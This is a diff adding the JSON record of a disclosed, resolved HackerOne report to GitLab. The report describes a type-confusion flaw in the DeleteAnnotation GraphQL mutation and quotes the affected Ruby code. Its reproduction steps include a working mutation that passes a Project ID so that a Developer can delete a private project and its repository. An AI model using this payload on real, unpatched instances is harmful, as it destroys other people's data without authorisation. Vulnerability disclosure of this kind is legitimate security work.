@@ -1,0 +1,123 @@
+{
+  "id": 960244,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NjAyNDQ=",
+  "url": "https://hackerone.com/reports/960244",
+  "title": "Insufficient Type Check leading to Developer ability to delete Project, Repository, Group, ...",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-08-17T07:28:36.164Z",
+  "submitted_at": "2020-08-17T07:28:36.178Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ledz1996",
+    "url": "/ledz1996",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/584/872/78b4b2fa1173d85b7f043e9c6fc027af5699cdfc_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-11-02T16:12:02.665Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-11-02T16:12:02.592Z",
+  "team_member_agreed_on_going_public_at": "2020-11-02T15:37:14.455Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\nSimilar bug to #858671, but this time with annotations mutation: `DeleteAnnotation`\n\nin ***app/graphql/mutations/metrics/dashboard/annotations/base.rb***\n\n```ruby\nmodule Mutations\n  module Metrics\n    module Dashboard\n      module Annotations\n        class Base < BaseMutation\n          private\n\n          # This method is defined here in order to be used by `authorized_find!` in the subclasses.\n          def find_object(id:)\n            GitlabSchema.object_from_id(id)\n          end\n        end\n      end\n    end\n  end\nend\n\n```\n\nThere is no type check for `find_object` in ***app/graphql/mutations/metrics/dashboard/annotations/delete.rb***\n```ruby\n    annotation = authorized_find!(id: id)\n\n            result = ::Metrics::Dashboard::Annotations::DeleteService.new(context[:current_user], annotation).execute\n```\n\nAnd luckily, Developer is sufficient for the permission check \n\n***app/services/metrics/dashboard/annotations/delete_service.rb***\n```ruby\nAbility.allowed?(user, :delete_metrics_dashboard_annotation, annotation)\n```\n\n### Steps to reproduce\n\n1. For User A, Create project A Private adding User B as Developer\n2. For User B, execute the following mutation in `http://gitlab.example.vm/-/graphql-explorer`\n\n```graphql\nmutation {\n  deleteAnnotation(input: {id: \"gid://Gitlab/Project/<project-id>\"}) {\n    clientMutationId\n  }\n}\n```\n3. Project disappear along with Repository\n\n███████\n\n#### Results of GitLab environment info\n\n```\nSystem information\nSystem:     \nProxy:      no\nCurrent User:   git\nUsing RVM:  no\nRuby Version:   2.6.6p146\nGem Version:    2.7.10\nBundler Version:1.17.3\nRake Version:   12.3.3\nRedis Version:  5.0.9\nGit Version:    2.27.0\nSidekiq Version:5.2.9\nGo Version: unknown\n\nGitLab information\nVersion:    13.2.3-ee\nRevision:   640e2695514\nDirectory:  /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter: PostgreSQL\nDB Version: 11.7\nURL:        http://gitlab.example.vm\nHTTP Clone URL: http://gitlab.example.vm/some-group/some-project.git\nSSH Clone URL:  git@gitlab.example.vm:some-group/some-project.git\nElasticsearch:  no\nGeo:        no\nUsing LDAP: no\nUsing Omniauth: yes\nOmniauth Providers: \n\nGitLab Shell\nVersion:    13.3.0\nRepository storage paths:\n- default:  /var/opt/gitlab/git-data/repositories\nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\nGit:        /opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nUnauthorized deleting of repository/project by maintainers, developers",
+  "weakness": {
+    "id": 66,
+    "name": "Type Confusion"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 16,
+  "voters": [
+    "sky003",
+    "n1m0",
+    "ali",
+    "akashhamal0x01",
+    "hakivvi",
+    "m0ti0nl3ss_",
+    "javier_carrillo",
+    "drjzoidberg",
+    "meispi",
+    "s0va55ah",
+    "and 6 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 39022,
+    "asset_type": "OTHER",
+    "asset_identifier": "Your Own GitLab Instance",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
